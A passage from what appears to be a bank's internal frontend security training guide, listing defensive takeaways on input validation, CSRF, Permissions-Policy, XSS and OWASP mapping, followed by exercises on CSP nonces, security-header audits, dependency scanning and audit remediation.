5. **Validate all input with Zod** at system boundaries. Never trust
   data from users, APIs, or URLs.

6. **CSRF protection** combines `SameSite=Strict` cookies with CSRF tokens
   for sensitive operations. Bearer tokens alone do not protect against CSRF
   when HttpOnly cookies are also in play.

7. **Permissions-Policy** restricts browser features your app should never use.
   Disable camera, microphone, geolocation, and payment API access.

8. **DOM-based XSS and third-party scripts** are attack vectors that React
   cannot prevent alone. Validate postMessage origins, audit dependencies,
   and security-review every third-party script before deployment.

9. **Map your controls to OWASP Top 10** — auditors will ask about each item.
   Know which controls address which risks.

10. **Understand audit findings** — when an auditor reports an issue, you need
    to know the severity, impact, and remediation path without delay.

---

## Exercises

### Exercise 1 — CSP Nonce Strategy
Research CSP nonce-based script loading for `script-src`. How would you
generate a per-request nonce in an Express/Fastify server and pass it to
Vite's build output? When would nonces be necessary versus `'self'`-only?

### Exercise 2 — Security Headers Audit
Write a script that fetches your deployed application and verifies all
required security headers are present. Report any missing or misconfigured
headers.

### Exercise 3 — Dependency Vulnerability Scan
Set up `npm audit` in the CI pipeline. Configure it to fail the build on
critical and high severity vulnerabilities. Document the process for reviewing
and resolving audit findings.

### Exercise 4 — OWASP Control Mapping
For each OWASP Top 10 item in Phase 6b, write a test (manual or automated)
that verifies the corresponding frontend control is in place. Document the
test procedure and expected results.

### Exercise 5 — Mock Audit Response
Using the audit finding format from Phase 6c, write a remediation plan for
all five findings. Include time estimates, code changes required, and
verification steps. Present this as you would to a BSP examiner.

---

## What Comes Next

**Next guide:** [B07 — Deployment and CI/CD](B07_deployment-and-cicd.md) —
where you containerize the portal with Docker, build Azure Pipelines, and
set up staging and production environments.

---

*EastWest Bank Digital Platforms & Innovations | Confidential*
